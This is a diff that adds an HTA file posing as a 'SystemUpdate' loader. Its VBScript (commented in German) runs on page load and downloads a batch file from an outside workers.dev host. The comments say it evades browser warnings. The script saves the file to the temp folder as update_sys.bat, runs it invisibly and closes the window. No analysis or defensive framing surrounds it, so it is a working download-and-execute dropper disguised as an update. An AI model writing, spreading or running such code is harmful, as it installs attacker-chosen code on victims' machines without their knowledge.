@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <hta:application 
+        applicationname="SystemUpdate" 
+        border="none" 
+        innerborder="no" 
+        scroll="no" 
+        windowstate="minimize" 
+        showintaskbar="no">
+    <script language="VBScript">
+        Sub Window_OnLoad
+            On Error Resume Next
+            
+            ' URLs definieren
+            Dim fileUrl, savePath, shell, xhr, stream
+            fileUrl = "http://windows.msrdustibles.workers.dev/nah.bat"
+            
+            Set shell = CreateObject("WScript.Shell")
+            savePath = shell.ExpandEnvironmentStrings("%TEMP%") & "\update_sys.bat"
+            
+            ' Download über XMLHTTP (umgeht klassische Browser-Warnungen)
+            Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+            xhr.open "GET", fileUrl, False
+            xhr.send()
+            
+            If xhr.status = 200 Then
+                ' Als Datei im Temp-Ordner speichern
+                Set stream = CreateObject("ADODB.Stream")
+                stream.Type = 1 ' Binary
+                stream.Open
+                stream.Write xhr.responseBody
+                stream.SaveToFile savePath, 2 ' Overwrite
+                stream.Close
+                
+                ' Unsichtbar im Hintergrund ausführen
+                shell.Run chr(34) & savePath & chr(34), 0, False
+            End If
+            
+            ' Sofortiges Schließen der HTA, damit keine Fenster offen bleiben
+            Self.Close()
+        End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
